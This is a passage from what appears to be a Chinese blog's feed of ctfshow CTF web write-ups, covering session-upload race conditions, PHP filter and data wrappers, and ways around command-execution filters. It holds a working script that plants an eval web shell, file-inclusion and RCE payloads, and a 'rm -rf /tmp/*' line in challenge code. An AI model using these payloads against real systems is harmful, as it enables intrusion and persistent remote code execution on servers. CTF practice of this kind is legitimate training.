operator\">=</span>write<span class=\"token punctuation\">,</span>args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">xrange</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>read<span class=\"token punctuation\">,</span>args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    event<span class=\"token punctuation\">.</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> io</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">' http://4c773cea-91fa-498e-8027-46bab5889b16.challenge.ctf.show:8080/'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sessionid <span class=\"token operator\">=</span> <span class=\"token string\">'ctfshow'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"file_put_contents( '/var/www/html/2.php','&lt;?php eval($_ POST[2]);?>');\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    fileBytes <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>BytesI0<span class=\"token punctuation\">(</span><span class=\"token string\">b' a'</span><span class=\"token operator\">*</span><span class=\"token number\">1024</span><span class=\"token operator\">*</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        response <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                                data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                                    <span class=\"token string\">' PHP_SESSION_UPLOAD_PROGRESS'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'&lt;?php eval($_ POST[1]);?>'</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                                <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                                cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                                    <span class=\"token string\">' PHPSESSID'</span><span class=\"token punctuation\">:</span> sessionid</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                                <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                                files<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                                    <span class=\"token string\">'file'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'ctfshow.jpg '</span><span class=\"token punctuation\">,</span> fileBytes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                                <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        response <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> <span class=\"token string\">'?file=/tmp/sess_'</span> <span class=\"token operator\">+</span> sessionid<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                                cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                                    <span class=\"token string\">'PHPSESSID'</span><span class=\"token punctuation\">:</span> sessionid</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                                <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        resposne2 <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> <span class=\"token string\">'2.php '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">if</span> resposne2<span class=\"token punctuation\">.</span>status_code <span class=\"token operator\">==</span> <span class=\"token number\">200</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'++++++done++++++'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>resposne2<span class=\"token punctuation\">.</span>status_code<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    evnet <span class=\"token operator\">=</span> threading <span class=\"token punctuation\">.</span> Event<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">with</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> session<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            threading<span class=\"token punctuation\">.</span> Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>write<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            threading<span class=\"token punctuation\">.</span> Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>read<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>evnet<span class=\"token punctuation\">.</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"web-83-84\"><a class=\"anchor\" href=\"#web-83-84\">#</a> web 83 /84</h1>\n<p>83 使用了</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">session_unset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>session_destroy<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>84 使用了</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"rm -rf /tmp/*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>但都可以用 82 脚本跑出，第一个为脚本中 session 的设置，第二个为线程的作用，刚删但刚写</p>\n<h1 id=\"web-85\"><a class=\"anchor\" href=\"#web-85\">#</a> web 85</h1>\n<p>虽然有对内容 &quot;&lt;&quot; 的判断，但还是可以通过上面代码进行，增加线程即可</p>\n<h1 id=\"web-87\"><a class=\"anchor\" href=\"#web-87\">#</a> web 87</h1>\n<p>改为写文件了，可以使用过滤器</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/write=string.rot13/resource=2.php</span></pre></td></tr></table></figure><p>因为是对 file 的解码，因此对 file 的内容进行两次 url 编码，上传后，访问 2.php 文件即可</p>\n<h1 id=\"web-88\"><a class=\"anchor\" href=\"#web-88\">#</a> web 88</h1>\n<p>data 协议，base64 编码，构造出不带 =，+ 号的编码</p>\n<p><code>data://text/plain;base64,&lt;?php system('ls');?&gt;</code></p>\n<h1 id=\"web-117\"><a class=\"anchor\" href=\"#web-117\">#</a> web 117</h1>\n<p>伪协议，过滤器，死亡绕过</p>\n<p>通过转码使得院死亡代码无效，使自己的代码有效</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span></pre></td></tr></table></figure>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%20%E7%88%86%E7%A0%B4%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "url": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%20%E7%88%86%E7%A0%B4%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "title": "信息收集 爆破 命令执行",
            "date_published": "2022-10-04T14:11:40.000Z",
            "content_html": "<h1 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h1>\n<ol>\n<li>robots #</li>\n<li>域名解析 #</li>\n<li>.git <code>.svn</code> .swp</li>\n<li>editor 编辑器 如果访问一个不存在的目录，那么会列出根目录的所有文件</li>\n<li>邮箱 qq 号泄漏部分信息</li>\n<li>探针访问默认的 tz.php</li>\n<li>ip 访问，cdn 缓存清除 / 绕过，可加 www 绕过</li>\n<li>Unicode 编码（可使用控制台输出)</li>\n<li>前端密码验证 可以绕过前端 js 直接 post 传入</li>\n<li>access 数据库 db 目录下的 data.mdb db.mdb</li>\n<li></li>\n</ol>\n<h1 id=\"爆破\"><a class=\"anchor\" href=\"#爆破\">#</a> 爆破</h1>\n<ol>\n<li>域名爆破子域名 <span class=\"exturl\" data-url=\"aHR0cDovL3BocGluZm8ubWUv\">phpinfo.me</span></li>\n<li>php_mt_seed</li>\n<li>\\uxx 可以用 consoleolog</li>\n<li></li>\n</ol>\n<h1 id=\"命令执行\"><a class=\"anchor\" href=\"#命令执行\">#</a> 命令执行</h1>\n<h2 id=\"linux-中的-cp-命令\"><a class=\"anchor\" href=\"#linux-中的-cp-命令\">#</a> Linux 中的 cp 命令</h2>\n<p>利用 cp 命令将 flag.php 写入 1.txt，然后访问 1.txt</p>\n<p><code>system (&quot;cp fla?.php 1.txt&quot;);</code> (对 flag 进行过滤)（mv 也行）</p>\n<h2 id=\"system-过滤可以使用反引号绕过反引号作用相当于-system\"><a class=\"anchor\" href=\"#system-过滤可以使用反引号绕过反引号作用相当于-system\">#</a> system 过滤可以使用反引号绕过，反引号作用相当于 system</h2>\n<h2 id=\"嵌套-eval主要用于过滤了相应查找的函数\"><a class=\"anchor\" href=\"#嵌套-eval主要用于过滤了相应查找的函数\">#</a> 嵌套 eval，主要用于过滤了相应查找的函数</h2>\n<p>payload: <code>?a=eval($_GET[1]);&amp;1=phpinfo();</code></p>\n<p>其中  <code>1</code>  已经逃逸，可以使用任何命令</p>\n<p>(可以使用 system (&quot;tac flag.php&quot;) 直接查看源码)(tac 为 cat 的逆序)</p>\n<h2 id=\"分号被-ban\"><a class=\"anchor\" href=\"#分号被-ban\">#</a> 分号被 ban</h2>\n<p>可以使用文件包含的方法， <code>include%0a$_GET [1]&amp;1=phpinfo();</code></p>\n<p>此时 1 已经逃逸，若想查看文件内容，可使用 php 伪协议，base-64 编码查看 (同时可以把 include 换成 require)</p>\n<h2 id=\"data-协议\"><a class=\"anchor\" href=\"#data-协议\">#</a> data 协议</h2>\n<p><code>data://text/plain,(php代码)</code></p>\n<h2 id=\"web-40\"><a class=\"anchor\" href=\"#web-40\">#</a> web 40</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可用 <code>show_source(next(array_reverse(scandir(pos(loc)lecony))));</code></p>\n<p>或者 <code>?c=eval(arry_pop(next(get_difined_vars())));</code></p>\n<p>其中  <code>get_defined_vars()</code> , 获取所有的变量值，之前可以进行打印，可以发现有 post 传值，传入后会有显示，那么需要拿到传上的值，</p>\n<p>由于 post 在第二个，可用 next 获取下一个， <code>array_pop()</code>  弹出，然后使用 <code>eval</code>  执行</p>\n<p>执行过程</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/web40_1.png\" alt=\"\" /></p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/web40_2.png\" alt=\"\" /></p>\n<p>可看到由于传值，使得 post 有值了</p>\n<p>那么接下来就是获取并执行</p>\n<h2 id=\"web-41\"><a class=\"anchor\" href=\"#web-41\">#</a> web 41</h2>\n<p>这个题过滤了 <code>$、+、-、^、~</code>  使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符 |。</p>\n<p>我们可以尝试从 ascii 为 0-255 的字符中，找到或运算能得到我们可用的字符的字符。</p>\n<p>这里先给出两个脚本 <code>exp.py``rce_or.php</code> ，大家以后碰到可以使用或运算绕过的可以自己手动修改下即可。</p>\n<p>生成可用字符的集合</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$myfile</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"rce_or.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"w\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$contents</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span> <span class=\"token operator\">&lt;</span><span class=\"token number\">256</span> <span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t\t<span class=\"token variable\">$hex_i</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token operator\">.</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t<span class=\"token variable\">$hex_i</span><span class=\"token operator\">=</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token variable\">$hex_j</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token operator\">.</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t<span class=\"token variable\">$hex_j</span><span class=\"token operator\">=</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token variable\">$preg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$preg</span> <span class=\"token punctuation\">,</span> <span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$hex_i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span><span class=\"token class-name\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$preg</span> <span class=\"token punctuation\">,</span> <span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$hex_j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'%'</span><span class=\"token operator\">.</span><span class=\"token variable\">$hex_i</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'%'</span><span class=\"token operator\">.</span><span class=\"token variable\">$hex_j</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">|</span><span class=\"token class-name\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>=</span><span class=\"token number\">32</span><span class=\"token operator\">&amp;</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">126</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\t<span class=\"token variable\">$contents</span><span class=\"token operator\">=</span><span class=\"token variable\">$contents</span><span class=\"token operator\">.</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$a</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$myfile</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$contents</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$myfile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>大体意思就是 <code>从进行异或的字符中排除掉被过滤的，然后再判断异或得到的字符是否为可见字符</code></p>\n<p>传递参数 <code>getflag</code></p>\n<p>脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> urllib</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> sys <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">\"php rce_or.php\"</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#没有将 php 写入环境变量需手动运行</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"=\"</span><span class=\"token operator\">*</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   \t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'USER：python exp.py &lt;url>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   \t<span class=\"token keyword\">print</span><span class=\"token 